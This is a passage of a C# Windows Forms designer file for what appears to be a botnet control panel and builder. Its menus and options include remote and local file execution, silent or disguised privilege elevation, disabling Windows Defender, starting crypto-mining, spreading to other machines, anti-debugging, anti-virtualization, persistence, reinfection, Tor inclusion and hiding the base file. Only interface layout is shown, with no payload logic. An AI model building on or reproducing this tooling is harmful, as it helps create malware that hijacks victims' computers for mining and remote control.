            this.cmdExec.Name = "cmdExec";
            this.cmdExec.Size = new System.Drawing.Size(130, 22);
            this.cmdExec.Text = "Local File";
            this.cmdExec.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdRemoteExec
            // 
            this.cmdRemoteExec.Name = "cmdRemoteExec";
            this.cmdRemoteExec.Size = new System.Drawing.Size(130, 22);
            this.cmdRemoteExec.Text = "Remote File";
            this.cmdRemoteExec.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdCommand
            // 
            this.cmdCommand.Name = "cmdCommand";
            this.cmdCommand.Size = new System.Drawing.Size(130, 22);
            this.cmdCommand.Text = "Command";
            this.cmdCommand.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // miningToolStripMenuItem
            // 
            this.miningToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdAskElevate,
            this.cmdDisguisedElevate,
            this.cmdSilentElevate});
            this.miningToolStripMenuItem.Name = "miningToolStripMenuItem";
            this.miningToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
            this.miningToolStripMenuItem.Text = "Elevate";
            // 
            // cmdAskElevate
            // 
            this.cmdAskElevate.Name = "cmdAskElevate";
            this.cmdAskElevate.Size = new System.Drawing.Size(120, 22);
            this.cmdAskElevate.Text = "Ask User";
            this.cmdAskElevate.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdDisguisedElevate
            // 
            this.cmdDisguisedElevate.Name = "cmdDisguisedElevate";
            this.cmdDisguisedElevate.Size = new System.Drawing.Size(120, 22);
            this.cmdDisguisedElevate.Text = "Disguised";
            this.cmdDisguisedElevate.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdSilentElevate
            // 
            this.cmdSilentElevate.Name = "cmdSilentElevate";
            this.cmdSilentElevate.Size = new System.Drawing.Size(120, 22);
            this.cmdSilentElevate.Text = "Silent";
            this.cmdSilentElevate.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // windowsDefenderToolStripMenuItem
            // 
            this.windowsDefenderToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdDefenderOff,
            this.cmdDefenderOn});
            this.windowsDefenderToolStripMenuItem.Name = "windowsDefenderToolStripMenuItem";
            this.windowsDefenderToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
            this.windowsDefenderToolStripMenuItem.Text = "Windows Defender";
            // 
            // cmdDefenderOff
            // 
            this.cmdDefenderOff.Name = "cmdDefenderOff";
            this.cmdDefenderOff.Size = new System.Drawing.Size(113, 22);
            this.cmdDefenderOff.Text = "Turn Off";
            this.cmdDefenderOff.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdDefenderOn
            // 
            this.cmdDefenderOn.Name = "cmdDefenderOn";
            this.cmdDefenderOn.Size = new System.Drawing.Size(113, 22);
            this.cmdDefenderOn.Text = "Turn On";
            this.cmdDefenderOn.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // miningToolStripMenuItem1
            // 
            this.miningToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdStartMining,
            this.cmdQueryMining});
            this.miningToolStripMenuItem1.Name = "miningToolStripMenuItem1";
            this.miningToolStripMenuItem1.Size = new System.Drawing.Size(165, 22);
            this.miningToolStripMenuItem1.Text = "Mining";
            // 
            // cmdStartMining
            // 
            this.cmdStartMining.Name = "cmdStartMining";
            this.cmdStartMining.Size = new System.Drawing.Size(102, 22);
            this.cmdStartMining.Text = "Start";
            this.cmdStartMining.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdQueryMining
            // 
            this.cmdQueryMining.Name = "cmdQueryMining";
            this.cmdQueryMining.Size = new System.Drawing.Size(102, 22);
            this.cmdQueryMining.Text = "Query";
            this.cmdQueryMining.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // spreadingToolStripMenuItem
            // 
            this.spreadingToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdStartSpreading,
            this.cmdDisinfect});
            this.spreadingToolStripMenuItem.Name = "spreadingToolStripMenuItem";
            this.spreadingToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.spreadingToolStripMenuItem.Text = "Spreading";
            // 
            // cmdStartSpreading
            // 
            this.cmdStartSpreading.Name = "cmdStartSpreading";
            this.cmdStartSpreading.Size = new System.Drawing.Size(115, 22);
            this.cmdStartSpreading.Text = "Start";
            this.cmdStartSpreading.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdDisinfect
            // 
            this.cmdDisinfect.Name = "cmdDisinfect";
            this.cmdDisinfect.Size = new System.Drawing.Size(115, 22);
            this.cmdDisinfect.Text = "Disinfect";
            this.cmdDisinfect.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // miscToolStripMenuItem
            // 
            this.miscToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cmdMessageBox});
            this.miscToolStripMenuItem.Name = "miscToolStripMenuItem";
            this.miscToolStripMenuItem.Size = new System.Drawing.Size(149, 22);
            this.miscToolStripMenuItem.Text = "Misc";
            // 
            // cmdMessageBox
            // 
            this.cmdMessageBox.Name = "cmdMessageBox";
            this.cmdMessageBox.Size = new System.Drawing.Size(135, 22);
            this.cmdMessageBox.Text = "MessageBox";
            this.cmdMessageBox.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // cmdAbort
            // 
            this.cmdAbort.Name = "cmdAbort";
            this.cmdAbort.Size = new System.Drawing.Size(149, 22);
            this.cmdAbort.Text = "&Abort Command";
            this.cmdAbort.Click += new System.EventHandler(this.CmdItem_Click);
            // 
            // Page3
            // 
            this.Page3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.Page3.Controls.Add(this.fileView);
            this.Page3.Location = new System.Drawing.Point(4, 5);
            this.Page3.Name = "Page3";
            this.Page3.Padding = new System.Windows.Forms.Padding(3);
            this.Page3.Size = new System.Drawing.Size(623, 451);
            this.Page3.TabIndex = 2;
            this.Page3.Text = "tabPage3";
            // 
            // fileView
            // 
            this.fileView.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.fileView.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.fileView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2});
            this.fileView.ContextMenuStrip = this.fileMenu;
            this.fileView.Dock = System.Windows.Forms.DockStyle.Fill;
            this.fileView.ForeColor = System.Drawing.Color.White;
            this.fileView.FullRowSelect = true;
            this.fileView.HideSelection = false;
            this.fileView.Location = new System.Drawing.Point(3, 3);
            this.fileView.MultiSelect = false;
            this.fileView.Name = "fileView";
            this.fileView.Size = new System.Drawing.Size(617, 445);
            this.fileView.Sorting = System.Windows.Forms.SortOrder.Descending;
            this.fileView.TabIndex = 0;
            this.fileView.UseCompatibleStateImageBehavior = false;
            this.fileView.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Name";
            this.columnHeader1.Width = 165;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Date modified";
            this.columnHeader2.Width = 142;
            // 
            // fileMenu
            // 
            this.fileMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.downloadToolStripMenuItem,
            this.DeleteStripMenuItem1,
            this.uploadHereToolStripMenuItem});
            this.fileMenu.Name = "fileMenu";
            this.fileMenu.Size = new System.Drawing.Size(139, 70);
            // 
            // downloadToolStripMenuItem
            // 
            this.downloadToolStripMenuItem.Name = "downloadToolStripMenuItem";
            this.downloadToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.downloadToolStripMenuItem.Text = "Download";
            this.downloadToolStripMenuItem.Click += new System.EventHandler(this.DownloadToolStripMenuItem_Click);
            // 
            // DeleteStripMenuItem1
            // 
            this.DeleteStripMenuItem1.Name = "DeleteStripMenuItem1";
            this.DeleteStripMenuItem1.Size = new System.Drawing.Size(138, 22);
            this.DeleteStripMenuItem1.Text = "Delete";
            this.DeleteStripMenuItem1.Click += new System.EventHandler(this.DeleteStripMenuItem1_Click);
            // 
            // uploadHereToolStripMenuItem
            // 
            this.uploadHereToolStripMenuItem.Name = "uploadHereToolStripMenuItem";
            this.uploadHereToolStripMenuItem.Size = new System.Drawing.Size(138, 22);
            this.uploadHereToolStripMenuItem.Text = "Upload here";
            this.uploadHereToolStripMenuItem.Click += new System.EventHandler(this.UploadHereToolStripMenuItem_Click);
            // 
            // Page4
            // 
            this.Page4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.Page4.Controls.Add(this.clearButton);
            this.Page4.Controls.Add(this.refreshButton);
            this.Page4.Controls.Add(this.logBox);
            this.Page4.Controls.Add(this.logDropdown);
            this.Page4.ForeColor = System.Drawing.Color.White;
            this.Page4.Location = new System.Drawing.Point(4, 5);
            this.Page4.Name = "Page4";
            this.Page4.Padding = new System.Windows.Forms.Padding(3);
            this.Page4.Size = new System.Drawing.Size(623, 451);
            this.Page4.TabIndex = 3;
            this.Page4.Text = "tabPage4";
            // 
            // clearButton
            // 
            this.clearButton.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.clearButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.clearButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.clearButton.BorderRadius = 2;
            this.clearButton.ButtonText = "  Clear";
            this.clearButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.clearButton.DisabledColor = System.Drawing.Color.Gray;
            this.clearButton.Iconcolor = System.Drawing.Color.Transparent;
            this.clearButton.Iconimage = ((System.Drawing.Image)(resources.GetObject("clearButton.Iconimage")));
            this.clearButton.Iconimage_right = null;
            this.clearButton.Iconimage_right_Selected = null;
            this.clearButton.Iconimage_Selected = null;
            this.clearButton.IconMarginLeft = 10;
            this.clearButton.IconMarginRight = 0;
            this.clearButton.IconRightVisible = false;
            this.clearButton.IconRightZoom = 0D;
            this.clearButton.IconVisible = false;
            this.clearButton.IconZoom = 50D;
            this.clearButton.IsTab = false;
            this.clearButton.Location = new System.Drawing.Point(377, 23);
            this.clearButton.Name = "clearButton";
            this.clearButton.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.clearButton.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.clearButton.OnHoverTextColor = System.Drawing.Color.White;
            this.clearButton.selected = false;
            this.clearButton.Size = new System.Drawing.Size(109, 35);
            this.clearButton.TabIndex = 10;
            this.clearButton.Text = "  Clear";
            this.clearButton.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.clearButton.Textcolor = System.Drawing.Color.White;
            this.clearButton.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.clearButton.Load += new System.EventHandler(this.FixButtonIcon);
            this.clearButton.Click += new System.EventHandler(this.ClearButton_Click);
            // 
            // refreshButton
            // 
            this.refreshButton.Activecolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.refreshButton.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.refreshButton.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.refreshButton.BorderRadius = 2;
            this.refreshButton.ButtonText = "  Refresh";
            this.refreshButton.Cursor = System.Windows.Forms.Cursors.Hand;
            this.refreshButton.DisabledColor = System.Drawing.Color.Gray;
            this.refreshButton.Iconcolor = System.Drawing.Color.Transparent;
            this.refreshButton.Iconimage = ((System.Drawing.Image)(resources.GetObject("refreshButton.Iconimage")));
            this.refreshButton.Iconimage_right = null;
            this.refreshButton.Iconimage_right_Selected = null;
            this.refreshButton.Iconimage_Selected = null;
            this.refreshButton.IconMarginLeft = 10;
            this.refreshButton.IconMarginRight = 0;
            this.refreshButton.IconRightVisible = false;
            this.refreshButton.IconRightZoom = 0D;
            this.refreshButton.IconVisible = false;
            this.refreshButton.IconZoom = 50D;
            this.refreshButton.IsTab = false;
            this.refreshButton.Location = new System.Drawing.Point(262, 23);
            this.refreshButton.Name = "refreshButton";
            this.refreshButton.Normalcolor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.refreshButton.OnHovercolor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.refreshButton.OnHoverTextColor = System.Drawing.Color.White;
            this.refreshButton.selected = false;
            this.refreshButton.Size = new System.Drawing.Size(109, 35);
            this.refreshButton.TabIndex = 9;
            this.refreshButton.Text = "  Refresh";
            this.refreshButton.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.refreshButton.Textcolor = System.Drawing.Color.White;
            this.refreshButton.TextFont = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.refreshButton.Load += new System.EventHandler(this.FixButtonIcon);
            this.refreshButton.Click += new System.EventHandler(this.RefreshButton_Click);
            // 
            // logBox
            // 
            this.logBox.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.logBox.Font = new System.Drawing.Font("Consolas", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.logBox.ForeColor = System.Drawing.Color.White;
            this.logBox.Location = new System.Drawing.Point(23, 64);
            this.logBox.Multiline = true;
            this.logBox.Name = "logBox";
            this.logBox.ReadOnly = true;
            this.logBox.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.logBox.Size = new System.Drawing.Size(573, 343);
            this.logBox.TabIndex = 2;
            this.logBox.Text = "Please select a bot first.";
            // 
            // logDropdown
            // 
            this.logDropdown.BackColor = System.Drawing.Color.Transparent;
            this.logDropdown.BorderRadius = 3;
            this.logDropdown.ForeColor = System.Drawing.Color.White;
            this.logDropdown.Items = new string[] {
        "Bot name"};
            this.logDropdown.Location = new System.Drawing.Point(23, 23);
            this.logDropdown.Name = "logDropdown";
            this.logDropdown.NomalColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.logDropdown.onHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.logDropdown.selectedIndex = 0;
            this.logDropdown.Size = new System.Drawing.Size(217, 35);
            this.logDropdown.TabIndex = 1;
            this.logDropdown.onItemSelected += new System.EventHandler(this.LogDropdown_onItemSelected);
            this.logDropdown.VisibleChanged += new System.EventHandler(this.LogDropdown_VisibleChanged);
            // 
            // Page5
            // 
            this.Page5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(26)))), ((int)(((byte)(26)))), ((int)(((byte)(26)))));
            this.Page5.Controls.Add(this.secondarySettings);
            this.Page5.Controls.Add(this.buildProgressBar);
            this.Page5.Controls.Add(this.mainSettings);
            this.Page5.Controls.Add(this.buildButton);
            this.Page5.Location = new System.Drawing.Point(4, 5);
            this.Page5.Name = "Page5";
            this.Page5.Padding = new System.Windows.Forms.Padding(3);
            this.Page5.Size = new System.Drawing.Size(623, 451);
            this.Page5.TabIndex = 4;
            this.Page5.Text = "tabPage5";
            // 
            // secondarySettings
            // 
            this.secondarySettings.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.secondarySettings.BorderRadius = 5;
            this.secondarySettings.BottomSahddow = false;
            this.secondarySettings.color = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.secondarySettings.Controls.Add(this.torCheck);
            this.secondarySettings.Controls.Add(this.torLabel);
            this.secondarySettings.Controls.Add(this.hideCheck);
            this.secondarySettings.Controls.Add(this.label9);
            this.secondarySettings.Controls.Add(this.vectorLabel);
            this.secondarySettings.Controls.Add(this.vectorEdit);
            this.secondarySettings.Controls.Add(this.baseLocDropdown);
            this.secondarySettings.Controls.Add(this.baseLocLabel);
            this.secondarySettings.Controls.Add(this.baseNameLabel);
            this.secondarySettings.Controls.Add(this.baseNameEdit);
            this.secondarySettings.Controls.Add(this.meltCheck);
            this.secondarySettings.Controls.Add(this.meltLabel);
            this.secondarySettings.Controls.Add(this.elevateCheck);
            this.secondarySettings.Controls.Add(this.elevateLabel);
            this.secondarySettings.Controls.Add(this.windefCheck);
            this.secondarySettings.Controls.Add(this.windefLabel);
            this.secondarySettings.Controls.Add(this.sleepCheck);
            this.secondarySettings.Controls.Add(this.sleepLabel);
            this.secondarySettings.Controls.Add(this.antiDebugCheck);
            this.secondarySettings.Controls.Add(this.antiDebugLabel);
            this.secondarySettings.Controls.Add(this.antiVirtCheck);
            this.secondarySettings.Controls.Add(this.antiVirtLabel);
            this.secondarySettings.Controls.Add(this.reinfectCheck);
            this.secondarySettings.Controls.Add(this.reinfectLabel);
            this.secondarySettings.Controls.Add(this.persistenceCheck);
            this.secondarySettings.Controls.Add(this.persistenceLabel);
            this.secondarySettings.Controls.Add(this.startupCheck);
            this.secondarySettings.Controls.Add(this.sep2);
            this.secondarySettings.Controls.Add(this.sep1);
            this.secondarySettings.Controls.Add(this.folderStRadio);
            this.secondarySettings.Controls.Add(this.regStRadio);
            this.secondarySettings.Controls.Add(this.taskStRadio);
            this.secondarySettings.Controls.Add(this.autoStRadio);
            this.secondarySettings.Controls.Add(this.startupLabel);
            this.secondarySettings.LeftSahddow = false;
            this.secondarySettings.Location = new System.Drawing.Point(6, 119);
            this.secondarySettings.Name = "secondarySettings";
            this.secondarySettings.RightSahddow = false;
            this.secondarySettings.ShadowDepth = 2;
            this.secondarySettings.Size = new System.Drawing.Size(611, 248);
            this.secondarySettings.TabIndex = 10;
            // 
            // torCheck
            // 
            this.torCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.torCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.torCheck.Checked = true;
            this.torCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.torCheck.ForeColor = System.Drawing.Color.White;
            this.torCheck.Location = new System.Drawing.Point(421, 202);
            this.torCheck.Name = "torCheck";
            this.torCheck.Size = new System.Drawing.Size(20, 20);
            this.torCheck.TabIndex = 35;
            // 
            // torLabel
            // 
            this.torLabel.AutoSize = true;
            this.torLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.torLabel.Location = new System.Drawing.Point(447, 204);
            this.torLabel.Name = "torLabel";
            this.torLabel.Size = new System.Drawing.Size(68, 15);
            this.torLabel.TabIndex = 34;
            this.torLabel.Text = "Include Tor";
            // 
            // hideCheck
            // 
            this.hideCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.hideCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.hideCheck.Checked = true;
            this.hideCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.hideCheck.ForeColor = System.Drawing.Color.White;
            this.hideCheck.Location = new System.Drawing.Point(223, 202);
            this.hideCheck.Name = "hideCheck";
            this.hideCheck.Size = new System.Drawing.Size(20, 20);
            this.hideCheck.TabIndex = 33;
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label9.Location = new System.Drawing.Point(249, 204);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(64, 15);
            this.label9.TabIndex = 32;
            this.label9.Text = "Hide Base";
            // 
            // vectorLabel
            // 
            this.vectorLabel.AutoSize = true;
            this.vectorLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.vectorLabel.Location = new System.Drawing.Point(220, 144);
            this.vectorLabel.Name = "vectorLabel";
            this.vectorLabel.Size = new System.Drawing.Size(101, 15);
            this.vectorLabel.TabIndex = 31;
            this.vectorLabel.Text = "Spreading Vector";
            // 
            // vectorEdit
            // 
            this.vectorEdit.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.vectorEdit.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.vectorEdit.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.vectorEdit.BorderThickness = 2;
            this.vectorEdit.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.vectorEdit.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.vectorEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.vectorEdit.isPassword = false;
            this.vectorEdit.Location = new System.Drawing.Point(223, 165);
            this.vectorEdit.Margin = new System.Windows.Forms.Padding(4);
            this.vectorEdit.Name = "vectorEdit";
            this.vectorEdit.Size = new System.Drawing.Size(168, 30);
            this.vectorEdit.TabIndex = 30;
            this.vectorEdit.Text = "Manual";
            this.vectorEdit.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // baseLocDropdown
            // 
            this.baseLocDropdown.BackColor = System.Drawing.Color.Transparent;
            this.baseLocDropdown.BorderRadius = 3;
            this.baseLocDropdown.ForeColor = System.Drawing.Color.White;
            this.baseLocDropdown.Items = new string[] {
        "Application Data",
        "Temporary Files",
        "Desktop",
        "Saved Games",
        "Program Files",
        "Windows Folder"};
            this.baseLocDropdown.Location = new System.Drawing.Point(220, 108);
            this.baseLocDropdown.Name = "baseLocDropdown";
            this.baseLocDropdown.NomalColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.baseLocDropdown.onHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.baseLocDropdown.selectedIndex = 0;
            this.baseLocDropdown.Size = new System.Drawing.Size(168, 30);
            this.baseLocDropdown.TabIndex = 29;
            // 
            // baseLocLabel
            // 
            this.baseLocLabel.AutoSize = true;
            this.baseLocLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.baseLocLabel.Location = new System.Drawing.Point(217, 87);
            this.baseLocLabel.Name = "baseLocLabel";
            this.baseLocLabel.Size = new System.Drawing.Size(85, 15);
            this.baseLocLabel.TabIndex = 28;
            this.baseLocLabel.Text = "Base Location";
            // 
            // baseNameLabel
            // 
            this.baseNameLabel.AutoSize = true;
            this.baseNameLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.baseNameLabel.Location = new System.Drawing.Point(217, 26);
            this.baseNameLabel.Name = "baseNameLabel";
            this.baseNameLabel.Size = new System.Drawing.Size(72, 15);
            this.baseNameLabel.TabIndex = 27;
            this.baseNameLabel.Text = "Base Name";
            // 
            // baseNameEdit
            // 
            this.baseNameEdit.BorderColorFocused = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(186)))), ((int)(((byte)(255)))));
            this.baseNameEdit.BorderColorIdle = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(40)))));
            this.baseNameEdit.BorderColorMouseHover = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.baseNameEdit.BorderThickness = 2;
            this.baseNameEdit.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.baseNameEdit.Font = new System.Drawing.Font("Century Gothic", 9.75F);
            this.baseNameEdit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.baseNameEdit.isPassword = false;
            this.baseNameEdit.Location = new System.Drawing.Point(220, 47);
            this.baseNameEdit.Margin = new System.Windows.Forms.Padding(4);
            this.baseNameEdit.Name = "baseNameEdit";
            this.baseNameEdit.Size = new System.Drawing.Size(168, 30);
            this.baseNameEdit.TabIndex = 26;
            this.baseNameEdit.Text = "Orion";
            this.baseNameEdit.TextAlign = System.Windows.Forms.HorizontalAlignment.Left;
            // 
            // meltCheck
            // 
            this.meltCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.meltCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.meltCheck.Checked = false;
            this.meltCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.meltCheck.ForeColor = System.Drawing.Color.White;
            this.meltCheck.Location = new System.Drawing.Point(421, 172);
            this.meltCheck.Name = "meltCheck";
            this.meltCheck.Size = new System.Drawing.Size(20, 20);
            this.meltCheck.TabIndex = 25;
            // 
            // meltLabel
            // 
            this.meltLabel.AutoSize = true;
            this.meltLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.meltLabel.Location = new System.Drawing.Point(447, 174);
            this.meltLabel.Name = "meltLabel";
            this.meltLabel.Size = new System.Drawing.Size(31, 15);
            this.meltLabel.TabIndex = 24;
            this.meltLabel.Text = "Melt";
            // 
            // elevateCheck
            // 
            this.elevateCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.elevateCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.elevateCheck.Checked = false;
            this.elevateCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.elevateCheck.ForeColor = System.Drawing.Color.White;
            this.elevateCheck.Location = new System.Drawing.Point(421, 142);
            this.elevateCheck.Name = "elevateCheck";
            this.elevateCheck.Size = new System.Drawing.Size(20, 20);
            this.elevateCheck.TabIndex = 23;
            // 
            // elevateLabel
            // 
            this.elevateLabel.AutoSize = true;
            this.elevateLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.elevateLabel.Location = new System.Drawing.Point(447, 144);
            this.elevateLabel.Name = "elevateLabel";
            this.elevateLabel.Size = new System.Drawing.Size(47, 15);
            this.elevateLabel.TabIndex = 22;
            this.elevateLabel.Text = "Elevate";
            // 
            // windefCheck
            // 
            this.windefCheck.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.windefCheck.ChechedOffColor = System.Drawing.Color.FromArgb(((int)(((byte)(132)))), ((int)(((byte)(135)))), ((int)(((byte)(140)))));
            this.windefCheck.Checked = false;
            this.windefCheck.CheckedOnColor = System.Drawing.Color.FromArgb(((int)(((byte)(33)))), ((int)(((byte)(150)))), ((int)(((byte)(243)))));
            this.windefCheck.ForeColor = System.Drawing.Color.White;
            this.windefCheck.Location = new System.Drawing.Point(421, 112);
            this.windefCheck.Name = "windefCheck";
            this.windefCheck.Size = new System.Drawing.Size(20, 20);
            this.windefCheck.TabIndex = 21;
            // 
            // windefLabel
            // 
            this.windefLabel.AutoSize = true;
            this.windefLabel.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.windefLabel.Location = new System.Drawing.Point(447, 114);
            this.windefLabel.Name = "windefLabel";
            this.windefLabel.Size = new System.Drawing.Size(124, 15);
            this.windefLabel.TabIndex = 20;
            this.windefLabel.Text = "Disable WinDefender";
            // 
            // sleepCheck
            // 
